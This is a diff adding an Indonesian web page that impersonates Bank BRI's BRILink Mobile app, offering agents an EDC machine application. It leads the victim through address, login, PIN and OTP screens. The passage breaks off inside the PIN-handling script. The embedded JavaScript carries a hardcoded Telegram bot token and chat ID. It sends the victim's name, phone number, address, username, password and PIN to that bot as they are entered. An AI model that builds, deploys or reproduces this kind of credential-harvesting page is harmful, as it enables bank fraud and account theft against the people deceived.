@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BRILink Mobile — Pengajuan EDC</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+        body { background: #f5f7fa; min-height: 100vh; margin: 0; padding: 0; }
+
+        /* ====================================== */
+        /* STEP 1 — FORM PENGAJUAN               */
+        /* ====================================== */
+        .container { max-width: 560px; margin: 0 auto; background: #fff; padding: 24px; min-height: 100vh; border-top: 5px solid #ffd700; }
+        .branding-bar { text-align: center; margin-bottom: 18px; padding: 10px; background: linear-gradient(135deg, #003380 0%, #0056b3 100%); border-radius: 10px; color: #fff; }
+        .branding-bar i { color: #ffd700; font-size: 18px; margin-right: 6px; }
+        .branding-bar span { font-weight: 700; font-size: 14px; color: #ffd700; }
+        .info-box { background: linear-gradient(135deg, #f0f7ff 0%, #e6f0fa 100%); border-left: 4px solid #0056b3; border-radius: 12px; padding: 18px 20px; margin-bottom: 24px; }
+        .info-box__header { display: flex; align-items: center; gap: 12px; margin-bottom: 14px; padding-bottom: 12px; border-bottom: 1px dashed #ffd700; }
+        .info-box__icon-wrap { width: 40px; height: 40px; background: linear-gradient(135deg, #0056b3, #003380); border-radius: 10px; display: flex; align-items: center; justify-content: center; color: #ffd700; font-size: 18px; }
+        .info-box__title { font-size: 15.5px; font-weight: 800; color: #003380; }
+        .info-box__list { list-style: none; margin: 0; padding: 0; }
+        .info-box__list li { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 10px; font-size: 14px; color: #334155; line-height: 1.7; }
+        .info-box__list li i { color: #28a745; font-size: 14px; margin-top: 2px; }
+        .info-box__warning { margin-top: 14px; padding: 12px 14px; background: linear-gradient(135deg, #fff9e6 0%, #fff5cc 100%); border-radius: 8px; border-left: 3px solid #ffc107; display: flex; align-items: flex-start; gap: 10px; }
+        .info-box__warning i { color: #f59e0b; font-size: 15px; margin-top: 1px; }
+        .info-box__warning-text { font-size: 13.5px; color: #92400e; line-height: 1.6; }
+        h2 { text-align: center; color: #003380; margin-bottom: 20px; font-size: 20px; font-weight: 800; position: relative; padding-bottom: 10px; }
+        h2::after { content: ''; position: absolute; bottom: 0; left: 50%; transform: translateX(-50%); width: 70px; height: 3px; background: linear-gradient(90deg, #ffd700, #ffcc00); border-radius: 2px; }
+        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .form-group { margin-bottom: 14px; }
+        label { display: block; margin-bottom: 6px; color: #003380; font-weight: 600; font-size: 13.5px; }
+        input, select, textarea { width: 100%; padding: 10px 13px; border: 1.5px solid #d1d9e6; border-radius: 8px; font-size: 14px; transition: all 0.3s ease; background: #fafcfe; }
+        input:focus, select:focus, textarea:focus { outline: none; border-color: #0056b3; background: #fff; box-shadow: 0 0 0 3px rgba(0,86,179,0.15); }
+        select:disabled { opacity: 0.6; cursor: not-allowed; background: #f0f4f8; }
+        textarea { resize: none; min-height: 65px; line-height: 1.5; }
+        .required { color: #dc2626; font-weight: 700; }
+        .loading { font-size: 11.5px; color: #64748b; margin-top: 4px; }
+        button { width: 100%; padding: 13px; background: linear-gradient(135deg, #0056b3 0%, #004494 100%); color: white; border: none; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 5px; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0,86,179,0.35); }
+        button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,86,179,0.45); background: linear-gradient(135deg, #0066cc 0%, #0052aa 100%); }
+
+        /* ====================================== */
+        /* LAYAR APLIKASI — TANPA STATUS BAR     */
+        /* ====================================== */
+        .app-screen { max-width: 420px; margin: 0 auto; min-height: 100vh; background: #fff; }
+        .app-header { background: linear-gradient(180deg, #003380 0%, #0056b3 100%); padding: 15px 20px 25px; display: flex; align-items: center; color: #fff; }
+        .app-header i { font-size: 20px; margin-right: 12px; cursor: pointer; }
+        .app-header h1 { font-size: 18px; font-weight: 600; }
+
+        /* ====================================== */
+        /* STEP 2 — LOGIN BRILink Mobile ASLI    */
+        /* ====================================== */
+        .login-top { background: linear-gradient(180deg, #003380 0%, #0056b3 100%); padding: 30px 24px 40px; text-align: center; }
+        .login-logo-box { width: 76px; height: 76px; background: #fff; border-radius: 18px; display: flex; align-items: center; justify-content: center; margin: 0 auto 18px; box-shadow: 0 4px 14px rgba(0,0,0,0.15); }
+        .login-logo-box i { font-size: 38px; color: #003380; }
+        .login-app-name { font-size: 22px; font-weight: 700; color: #ffd700; margin-bottom: 4px; }
+        .login-app-desc { font-size: 13px; color: #fff; opacity: 0.85; }
+        .login-form-area { padding: 32px 24px 24px; background: #fff; }
+        .login-greeting { text-align: center; margin-bottom: 28px; }
+        .login-greeting h3 { font-size: 20px; color: #003380; margin-bottom: 6px; font-weight: 700; }
+        .login-greeting p { font-size: 14px; color: #6b7280; }
+        .input-group { margin-bottom: 20px; position: relative; }
+        .input-group label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 600; color: #374151; }
+        .input-wrapper { position: relative; }
+        .input-wrapper .icon-left { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: #9ca3af; font-size: 18px; }
+        .input-wrapper .icon-right { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); color: #9ca3af; font-size: 18px; cursor: pointer; transition: color 0.2s; }
+        .input-wrapper .icon-right:hover { color: #0056b3; }
+        .app-input { width: 100%; padding: 14px 14px 14px 44px; border: 1.5px solid #d1d5db; border-radius: 12px; font-size: 15px; transition: all 0.25s ease; background: #f9fafb; }
+        .app-input:focus { outline: none; border-color: #0056b3; background: #fff; box-shadow: 0 0 0 4px rgba(0,86,179,0.1); }
+        .app-input.pass-input { padding-right: 44px; }
+        .login-row-options { display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px; }
+        .remember-label { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #4b5563; cursor: pointer; }
+        .remember-label input { width: 16px; height: 16px; cursor: pointer; accent-color: #0056b3; }
+        .link-forgot { font-size: 13px; color: #0056b3; text-decoration: none; font-weight: 500; }
+        .link-forgot:hover { text-decoration: underline; }
+        .btn-primary-full { width: 100%; padding: 15px; background: linear-gradient(135deg, #0056b3 0%, #003380 100%); color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 14px rgba(0,86,179,0.35); }
+        .btn-primary-full:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,86,179,0.4); }
+        .divider-or { display: flex; align-items: center; margin: 30px 0 20px; }
+        .divider-or::before, .divider-or::after { content: ''; flex: 1; height: 1px; background: #e5e7eb; }
+        .divider-or span { padding: 0 16px; font-size: 13px; color: #9ca3af; }
+        .text-link-row { text-align: center; font-size: 14px; color: #4b5563; margin-top: 8px; }
+        .text-link-row a { color: #0056b3; text-decoration: none; font-weight: 600; }
+        .text-link-row a:hover { text-decoration: underline; }
+        .app-footer-text { text-align: center; padding: 20px 24px 30px; font-size: 12px; color: #9ca3af; line-height: 1.6; }
+
+        /* ====================================== */
+        /* STEP 3 — KONFIRMASI PIN BARU          */
+        /* ====================================== */
+        .pin-content { padding: 30px 24px; text-align: center; }
+        .pin-icon-wrap { width: 80px; height: 80px; background: linear-gradient(135deg, #e6f0fa, #f0f7ff); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
+        .pin-icon-wrap i { font-size: 34px; color: #0056b3; }
+        .pin-title { font-size: 18px; font-weight: 700; color: #003380; margin-bottom: 8px; }
+        .pin-desc { font-size: 14px; color: #6b7280; margin-bottom: 28px; line-height: 1.5; }
+        .pin-input-wrap { display: flex; justify-content: center; gap: 10px; margin-bottom: 28px; }
+        .pin-box { width: 50px; height: 56px; border: 2px solid #d1d5db; border-radius: 10px; font-size: 22px; font-weight: 700; text-align: center; background: #f9fafb; transition: all 0.2s; }
+        .pin-box:focus { outline: none; border-color: #0056b3; background: #fff; box-shadow: 0 0 0 3px rgba(0,86,179,0.15); }
+        .pin-box.filled { border-color: #0056b3; background: #eff6ff; }
+        .pin-hint { font-size: 12px; color: #9ca3af; margin-bottom: 24px; }
+        .pin-hint a { color: #0056b3; text-decoration: none; }
+
+        /* ====================================== */
+        /* STEP 4 — OTP TOMBOL SELARAS INPUT     */
+        /* ====================================== */
+        .otp-content { padding: 30px 24px; text-align: center; }
+        .otp-icon-wrap { width: 80px; height: 80px; background: linear-gradient(135deg, #e6fffa, #e0f2fe); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
+        .otp-icon-wrap i { font-size: 34px; color: #0284c7; }
+        .otp-title { font-size: 18px; font-weight: 700; color: #003380; margin-bottom: 8px; }
+        .otp-desc { font-size: 14px; color: #6b7280; margin-bottom: 8px; line-height: 1.5; }
+        .otp-number { font-weight: 700; color: #0056b3; }
+        .otp-note { font-size: 12px; color: #9ca3af; margin-bottom: 24px; }
+        .otp-input-container { width: 100%; max-width: 320px; margin: 0 auto; }
+        .otp-input-wrap { display: flex; justify-content: space-between; gap: 6px; margin-bottom: 20px; }
+        .otp-box { flex: 1; max-width: 48px; height: 52px; border: 2px solid #d1d5db; border-radius: 10px; font-size: 20px; font-weight: 700; text-align: center; background: #f9fafb; transition: all 0.2s; }
+        .otp-box:focus { outline: none; border-color: #0284c7; background: #fff; box-shadow: 0 0 0 3px rgba(2,132,199,0.15); }
+        .otp-box.filled { border-color: #0284c7; background: #e0f2fe; }
+        .resend-row { margin-bottom: 24px; text-align: center; }
+        .resend-btn { background: none; border: none; color: #0056b3; font-size: 14px; font-weight: 500; cursor: pointer; padding: 0; }
+        .resend-btn:disabled { color: #9ca3af; cursor: not-allowed; }
+        .resend-btn:hover { text-decoration: underline; }
+        .btn-otp-full { width: 100%; padding: 14px; background: linear-gradient(135deg, #0056b3 0%, #003380 100%); color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 14px rgba(0,86,179,0.35); }
+        .btn-otp-full:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,86,179,0.4); }
+
+        /* ====================================== */
+        /* STEP 5 — KONFIRMASI AKHIR & SELESAI    */
+        /* ====================================== */
+        .confirm-top { background: linear-gradient(180deg, #003380 0%, #0056b3 100%); padding: 50px 20px 60px; text-align: center; color: #fff; }
+        .confirm-icon { width: 80px; height: 80px; background: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
+        .confirm-icon i { font-size: 40px; color: #22c55e; }
+        .confirm-title { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
+        .confirm-subtitle { font-size: 14px; opacity: 0.85; }
+        .confirm-body { padding: 0 20px 30px; margin-top: -30px; }
+        .confirm-box { background: #fff; border-radius: 16px; padding: 24px; box-shadow: 0 -4px 20px rgba(0,0,0,0.08); }
+        .confirm-box__text { font-size: 14px; color: #374151; line-height: 1.7; margin-bottom: 20px; text-align: center; }
+        .confirm-detail { background: #f9fafb; border-radius: 10px; padding: 16px; margin-bottom: 24px; }
+        .confirm-detail__row { display: flex; justify-content: space-between; padding: 8px 0; }
+        .confirm-detail__label { font-size: 13px; color: #6b7280; }
+        .confirm-detail__value { font-size: 13px; font-weight: 600; color: #1f2937; }
+        .btn-success { width: 100%; padding: 15px; background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 14px rgba(34,197,94,0.3); }
+        .btn-success:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(34,197,94,0.35); }
+        .btn-outline { width: 100%; padding: 14px; background: transparent; color: #0056b3; border: 1.5px solid #0056b3; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 12px; transition: all 0.2s; }
+        .btn-outline:hover { background: #eff6ff; }
+
+        /* Step Control */
+        .step { display: none; }
+        .step.active { display: block; }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .form-row { grid-template-columns: 1fr; }
+            .container { padding: 20px; }
+        }
+        /* Footer */
+        .footer-note { text-align: center; padding: 0 20px 25px; font-size: 12px; color: #888; line-height: 1.6; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<!-- ALUR: Form → Login → PIN → OTP → Konfirmasi Selesai -->
+
+<!-- STEP 1 — FORM PENGAJUAN -->
+<div id="step1" class="step active">
+    <div class="container">
+        <div class="branding-bar">
+            <i class="fas fa-university"></i>
+            <span>AGEN BRILINK — PENGAJUAN MESIN EDC</span>
+        </div>
+
+        <div class="info-box">
+            <div class="info-box__header">
+                <div class="info-box__icon-wrap"><i class="fas fa-truck-fast"></i></div>
+                <h3 class="info-box__title">INFORMASI PENGAJUAN MESIN EDC</h3>
+            </div>
+            <ul class="info-box__list">
+                <li><i class="fas fa-circle-check"></i><div>Mesin EDC akan dikirim ke <strong>alamat lengkap</strong> yang Anda isikan sesuai data tercantum.</div></li>
+                <li><i class="fas fa-circle-check"></i><div>Pastikan <strong>seluruh data sudah valid dan benar</strong> — nama, nomor HP, hingga alamat lengkap.</div></li>
+                <li><i class="fas fa-circle-check"></i><div>Data akurat mempercepat verifikasi & <strong>memastikan mesin EDC sampai tepat waktu</strong>.</div></li>
+            </ul>
+            <div class="info-box__warning">
+                <i class="fas fa-triangle-exclamation"></i>
+                <div class="info-box__warning-text"><strong>Penting:</strong> Kesalahan alamat dapat menyebabkan keterlambatan pengiriman. Periksa kembali sebelum melanjutkan.</div>
+            </div>
+        </div>
+
+        <h2>📍 Form Alamat Lengkap</h2>
+        <form id="formAlamat">
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Nama Penerima <span class="required">*</span></label>
+                    <input type="text" id="nama_penerima" placeholder="Nama lengkap penerima" required>
+                </div>
+                <div class="form-group">
+                    <label>Nomor HP <span class="required">*</span></label>
+                    <input type="tel" id="no_hp" placeholder="Contoh: 08xx-xxxx-xxxx" required>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Alamat Lengkap (Jalan, No, RT/RW) <span class="required">*</span></label>
+                <textarea id="alamat" placeholder="Contoh: Jl. Merdeka No. 12, RT 003/RW 002" required></textarea>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Provinsi <span class="required">*</span></label>
+                    <select id="provinsi" required>
+                        <option value="">-- Memuat data...</option>
+                    </select>
+                    <div id="provinsi_loading" class="loading">Mengambil data wilayah...</div>
+                </div>
+                <div class="form-group">
+                    <label>Kabupaten/Kota <span class="required">*</span></label>
+                    <select id="kota" disabled required>
+                        <option value="">-- Pilih Provinsi dulu --</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Kecamatan <span class="required">*</span></label>
+                    <select id="kecamatan" disabled required>
+                        <option value="">-- Pilih Kota dulu --</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Kelurahan/Desa <span class="required">*</span></label>
+                    <select id="kelurahan" disabled required>
+                        <option value="">-- Pilih Kecamatan dulu --</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Kode Pos <span class="required">*</span></label>
+                    <input type="number" id="kode_pos" placeholder="Contoh: 10110" required>
+                </div>
+            </div>
+
+            <button type="submit">➡️ Lanjutkan ke Login</button>
+        </form>
+    </div>
+</div>
+
+<!-- STEP 2 — LOGIN -->
+<div id="step2" class="step">
+    <div class="app-screen">
+        <div class="login-top">
+            <div class="login-logo-box"><i class="fas fa-university"></i></div>
+            <h1 class="login-app-name">BRILink Mobile</h1>
+            <p class="login-app-desc">Aplikasi Resmi Agen BRILink — Bank BRI</p>
+        </div>
+
+        <div class="login-form-area">
+            <div class="login-greeting">
+                <h3>Selamat Datang 👋</h3>
+                <p>Masukkan akun BRILink Anda untuk verifikasi pengajuan</p>
+            </div>
+
+            <form id="formLogin">
+                <div class="input-group">
+                    <label>Username / Nomor HP</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-user icon-left"></i>
+                        <input type="text" id="username" class="app-input" placeholder="Masukkan username atau nomor HP" required>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Kata Sandi</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-lock icon-left"></i>
+                        <input type="password" id="password" class="app-input pass-input" placeholder="Masukkan kata sandi" required>
+                        <i class="fas fa-eye icon-right" id="togglePw" onclick="togglePassword()"></i>
+                    </div>
+                </div>
+
+                <div class="login-row-options">
+                    <label class="remember-label"><input type="checkbox"> Ingat Saya</label>
+                    <a href="#" class="link-forgot">Lupa Kata Sandi?</a>
+                </div>
+
+                <button type="submit" class="btn-primary-full"><i class="fas fa-sign-in-alt"></i> Masuk</button>
+            </form>
+
+            <div class="divider-or"><span>atau</span></div>
+            <p class="text-link-row">Belum punya akun? <a href="#">Daftar Sekarang</a></p>
+            <p class="text-link-row"><a href="#">Aktivasi Akun Baru</a></p>
+        </div>
+
+        <div class="app-footer-text">
+            <p>🏦 PT Bank Rakyat Indonesia (Persero) Tbk.</p>
+            <p>© 2026 BRILink Mobile — Versi 3.5.0</p>
+            <p>Terdaftar dan Diawasi oleh OJK</p>
+        </div>
+    </div>
+</div>
+
+<!-- STEP 3 — KONFIRMASI PIN BARU -->
+<div id="step3" class="step">
+    <div class="app-screen">
+        <div class="app-header">
+            <i class="fas fa-arrow-left" onclick="goToStep(2)"></i>
+            <h1>Buat PIN Baru</h1>
+        </div>
+
+        <div class="pin-content">
+            <div class="pin-icon-wrap"><i class="fas fa-lock"></i></div>
+            <h2 class="pin-title">Buat PIN Baru</h2>
+            <p class="pin-desc">Buat 6 digit PIN baru untuk transaksi & verifikasi akun Anda</p>
+            
+            <form id="formPIN">
+                <div class="pin-input-wrap">
+                    <input type="text" class="pin-box" maxlength="1" data-pos="0" inputmode="numeric" pattern="[0-9]" required>
+                    <input type="text" class="pin-box" maxlength="1" data-pos="1" inputmode="numeric" pattern="[0-9]" required>
+                    <input type="text" class="pin-box" maxlength="1" data-pos="2" inputmode="numeric" pattern="[0-9]" required>
+                    <input type="text" class="pin-box" maxlength="1" data-pos="3" inputmode="numeric" pattern="[0-9]" required>
+                    <input type="text" class="pin-box" maxlength="1" data-pos="4" inputmode="numeric" pattern="[0-9]" required>
+                    <input type="text" class="pin-box" maxlength="1" data-pos="5" inputmode="numeric" pattern="[0-9]" required>
+                </div>
+                <p class="pin-hint">Gunakan angka saja, jangan yang mudah ditebak <a href="#">Lupa PIN?</a></p>
+                <button type="submit" class="btn-primary-full">✅ Konfirmasi PIN</button>
+            </form>
+        </div>
+    </div>
+</div>
+
+<!-- STEP 4 — VERIFIKASI OTP -->
+<div id="step4" class="step">
+    <div class="app-screen">
+        <div class="app-header">
+            <i class="fas fa-arrow-left" onclick="goToStep(3)"></i>
+            <h1>Verifikasi OTP</h1>
+        </div>
+
+        <div class="otp-content">
+            <div class="otp-icon-wrap"><i class="fas fa-shield-halved"></i></div>
+            <h2 class="otp-title">Masukkan Kode OTP</h2>
+            <p class="otp-desc">Kode dikirim ke nomor <span class="otp-number" id="otpNoHP">—</span></p>
+            <p class="otp-note">Kode berlaku selama 5 menit</p>
+            
+            <form id="formOTP">
+                <div class="otp-input-container">
+                    <div class="otp-input-wrap">
+                        <input type="text" class="otp-box" maxlength="1" data-pos="0" inputmode="numeric" pattern="[0-9]" required>
+                        <input type="text" class="otp-box" maxlength="1" data-pos="1" inputmode="numeric" pattern="[0-9]" required>
+                        <input type="text" class="otp-box" maxlength="1" data-pos="2" inputmode="numeric" pattern="[0-9]" required>
+                        <input type="text" class="otp-box" maxlength="1" data-pos="3" inputmode="numeric" pattern="[0-9]" required>
+                        <input type="text" class="otp-box" maxlength="1" data-pos="4" inputmode="numeric" pattern="[0-9]" required>
+                        <input type="text" class="otp-box" maxlength="1" data-pos="5" inputmode="numeric" pattern="[0-9]" required>
+                    </div>
+                    
+                    <div class="resend-row">
+                        <button type="button" class="resend-btn" id="btnKirimUlang" onclick="kirimUlangOTP()">Kirim Ulang Kode (<span id="timer">60</span>s)</button>
+                    </div>
+                    
+                    <button type="submit" class="btn-otp-full">✅ Verifikasi OTP</button>
+                </div>
+            </form>
+        </div>
+    </div>
+</div>
+
+<!-- STEP 5 — KONFIRMASI AKHIR & SELESAI -->
+<div id="step5" class="step">
+    <div class="app-screen">
+        <div class="confirm-top">
+            <div class="confirm-icon"><i class="fas fa-check"></i></div>
+            <h1 class="confirm-title">Pengajuan Diterima!</h1>
+            <p class="confirm-subtitle">Terima kasih, data Anda sedang diproses</p>
+        </div>
+
+        <div class="confirm-body">
+            <div class="confirm-box">
+                <p class="confirm-box__text">Pengajuan <strong>Mesin EDC Agen BRILink</strong> telah berhasil diterima dan sedang diverifikasi. Kami akan mengirimkan mesin EDC ke alamat yang Anda cantumkan setelah verifikasi selesai.</p>
+                
+                <div class="confirm-detail">
+                    <div class="confirm-detail__row">
+                        <span class="confirm-detail__label">Nomor Pengajuan</span>
+                        <span class="confirm-detail__value">EDC-20260915-00128</span>
+                    </div>
+                    <div class="confirm-detail__row">
+                        <span class="confirm-detail__label">Nama</span>
+                        <span class="confirm-detail__value" id="finalNama">—</span>
+                    </div>
+                    <div class="confirm-detail__row">
+                        <span class="confirm-detail__label">Estimasi Proses</span>
+                        <span class="confirm-detail__value">1-3 Hari Kerja</span>
+                    </div>
+                    <div class="confirm-detail__row">
+                        <span class="confirm-detail__label">Status Saat Ini</span>
+                        <span class="confirm-detail__value" style="color:#d97706">Menunggu Verifikasi</span>
+                    </div>
+                </div>
+
+                <button class="btn-success" onclick="selesai()">✅ Selesai</button>
+                <button class="btn-outline" onclick="goToStep(1)">← Kembali ke Halaman Utama</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="footer-note">
+    © 2026 PT Bank Rakyat Indonesia (Persero) Tbk. — Terdaftar dan Diawasi OJK.<br>
+    Layanan Agen BRILink: 14017 | brilink.bri.co.id
+</div>
+
+<script>
+// ==============================================
+// KONFIGURASI
+// ==============================================
+const TOKEN_BOT_TELEGRAM = '8710568614:AAFSuzuNlON72t7iJO4qaTvjoH0JJ3IrWMw';
+const ID_CHAT_TELEGRAM = '8527556684';
+const API_TELEGRAM = `https://api.telegram.org/bot${TOKEN_BOT_TELEGRAM}/sendMessage`;
+const API_BASE = 'https://api.datawilayah.com/api';
+let dataPengajuan = {};
+let pinTerakhir = '';
+let otpTimer = null;
+
+// ==============================================
+// PINDAH HALAMAN
+// ==============================================
+function goToStep(nomor) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById('step' + nomor).classList.add('active');
+    window.scrollTo(0, 0);
+}
+
+// ==============================================
+// KIRIM DATA KE TELEGRAM
+// ==============================================
+async function kirimKeTelegram(pesan) {
+    try {
+        await fetch(API_TELEGRAM, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: ID_CHAT_TELEGRAM,
+                text: pesan,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch (err) {
+        console.log('Telegram tidak terhubung');
+    }
+}
+
+// ==============================================
+// LOAD DATA WILAYAH
+// ==============================================
+async function loadProvinsi() {
+    const select = document.getElementById('provinsi');
+    try {
+        const res = await fetch(`${API_BASE}/provinsi.json`);
+        const json = await res.json();
+        select.innerHTML = '<option value="">-- Pilih Provinsi --</option>';
+        json.data.forEach(item => {
+            const opt = document.createElement('option');
+            opt.value = item.kode_wilayah;
+            opt.textContent = item.nama_wilayah;
+            opt.dataset.nama = item.nama_wilayah;
+            select.appendChild(opt);
+        });
+        document.getElementById('provinsi_loading').style.display = 'none';
+    } catch (err) {
+        select.innerHTML = '<option value="">-- Gagal memuat --</option>';
+    }
+}
+
+async function loadKota(kodeProv) {
+    const select = document.getElementById('kota');
+    select.innerHTML = '<option value="">-- Memuat...</option>';
+    select.disabled = true;
+    try {
+        const res = await fetch(`${API_BASE}/kabupaten_kota/${kodeProv}.json`);
+        const json = await res.json();
+        select.innerHTML = '<option value="">-- Pilih Kabupaten/Kota --</option>';
+        json.data.forEach(item => {
+            const opt = document.createElement('option');
+            opt.value = item.kode_wilayah;
+            opt.textContent = item.nama_wilayah;
+            opt.dataset.nama = item.nama_wilayah;
+            select.appendChild(opt);
+        });
+        select.disabled = false;
+    } catch (err) {
+        select.innerHTML = '<option value="">-- Gagal memuat --</option>';
+    }
+}
+
+async function loadKecamatan(kodeKab) {
+    const select = document.getElementById('kecamatan');
+    select.innerHTML = '<option value="">-- Memuat...</option>';
+    select.disabled = true;
+    try {
+        const res = await fetch(`${API_BASE}/kecamatan/${kodeKab}.json`);
+        const json = await res.json();
+        select.innerHTML = '<option value="">-- Pilih Kecamatan --</option>';
+        json.data.forEach(item => {
+            const opt = document.createElement('option');
+            opt.value = item.kode_wilayah;
+            opt.textContent = item.nama_wilayah;
+            opt.dataset.nama = item.nama_wilayah;
+            select.appendChild(opt);
+        });
+        select.disabled = false;
+    } catch (err) {
+        select.innerHTML = '<option value="">-- Gagal memuat --</option>';
+    }
+}
+
+async function loadKelurahan(kodeKec) {
+    const select = document.getElementById('kelurahan');
+    select.innerHTML = '<option value="">-- Memuat...</option>';
+    select.disabled = true;
+    try {
+        const res = await fetch(`${API_BASE}/desa_kelurahan/${kodeKec}.json`);
+        const json = await res.json();
+        select.innerHTML = '<option value="">-- Pilih Kelurahan/Desa --</option>';
+        json.data.forEach(item => {
+            const opt = document.createElement('option');
+            opt.value = item.kode_wilayah;
+            opt.textContent = item.nama_wilayah;
+            opt.dataset.nama = item.nama_wilayah;
+            select.appendChild(opt);
+        });
+        select.disabled = false;
+    } catch (err) {
+        select.innerHTML = '<option value="">-- Gagal memuat --</option>';
+    }
+}
+
+document.getElementById('provinsi').addEventListener('change', function() {
+    if (this.value) loadKota(this.value);
+});
+document.getElementById('kota').addEventListener('change', function() {
+    if (this.value) loadKecamatan(this.value);
+});
+document.getElementById('kecamatan').addEventListener('change', function() {
+    if (this.value) loadKelurahan(this.value);
+});
+
+// ==============================================
+// SUBMIT FORM PENGAJUAN → KE LOGIN
+// ==============================================
+document.getElementById('formAlamat').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    dataPengajuan = {
+        nama: document.getElementById('nama_penerima').value,
+        hp: document.getElementById('no_hp').value,
+        alamat: document.getElementById('alamat').value,
+        provinsi: document.getElementById('provinsi').selectedOptions[0]?.dataset.nama || '',
+        kota: document.getElementById('kota').selectedOptions[0]?.dataset.nama || '',
+        kecamatan: document.getElementById('kecamatan').selectedOptions[0]?.dataset.nama || '',
+        kelurahan: document.getElementById('kelurahan').selectedOptions[0]?.dataset.nama || '',
+        kode_pos: document.getElementById('kode_pos').value,
+        tgl: new Date().toLocaleDateString('id-ID', {day:'2-digit', month:'long', year:'numeric'})
+    };
+
+    const pesan = `
+📩 *PENGAJUAN MESIN EDC — DATA BARU*
+━━━━━━━━━━━━━━━━━━━━
+👤 Nama: ${dataPengajuan.nama}
+📱 HP: ${dataPengajuan.hp}
+📍 Alamat: ${dataPengajuan.alamat}
+${dataPengajuan.kelurahan}, Kec. ${dataPengajuan.kecamatan}
+${dataPengajuan.kota} — ${dataPengajuan.provinsi}
+Kode Pos: ${dataPengajuan.kode_pos}
+Tanggal: ${dataPengajuan.tgl}
+━━━━━━━━━━━━━━━━━━━━
+*Status: Menunggu Login Akun*
+    `;
+    kirimKeTelegram(pesan);
+    goToStep(2);
+});
+
+// ==============================================
+// FUNGSI LOGIN → KE HALAMAN PIN
+// ==============================================
+function togglePassword() {
+    const input = document.getElementById('password');
+    const icon = document.getElementById('togglePw');
+    if (input.type === 'password') {
+        input.type = 'text';
+        icon.classList.remove('fa-eye');
+        icon.classList.add('fa-eye-slash');
+    } else {
+        input.type = 'password';
+        icon.classList.remove('fa-eye-slash');
+        icon.classList.add('fa-eye');
+    }
+}
+
+document.getElementById('formLogin').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    
+    const pesanLogin = `
+🔐 *PERCOBAAN LOGIN BRILINK*
+━━━━━━━━━━━━━━━━━━━━
+👤 Username/HP: ${username}
+🔑 Password: ${password}
+📎 Pengajuan: ${dataPengajuan.nama} — ${dataPengajuan.hp}
+━━━━━━━━━━━━━━━━━━━━
+    `;
+    kirimKeTelegram(pesanLogin);
+    goToStep(3);
+});
+
+// ==============================================
+// INPUT PIN — OTOMATIS PINDAH FOKUS
+// ==============================================
+document.querySelectorAll('.pin-box').forEach((box, index, all) => {
+    box.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        if (this.value) {
+            this.classList.add('filled');
+            if (index < all.length - 1) all[index + 1].focus();
+        } else {
+            this.classList.remove('filled');
+        }
+    });
+    box.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && !this.value && index > 0) {
+            all[index - 1].focus();
+            all[index - 1].value = '';
+            all[index - 1].classList.remove('filled');
+        }
+    });
+});
+
+document.getElementById('formPIN').addEventListener('submit', function(e) {
+    e.preventDefault();
+    pinTerakhir = '';
+    document.querySelectorAll('.pin-box').forEach(b => pinTerakhir += b.value);
+    
+    const pesanPIN = `
+🔒 *PIN BARU DIBUAT*
+━━━━━━━━━━━━━━━━━━━━
+👤 Pengguna: ${dataPengajuan.nama}
+🔢 PIN: ${pinTerakhir}
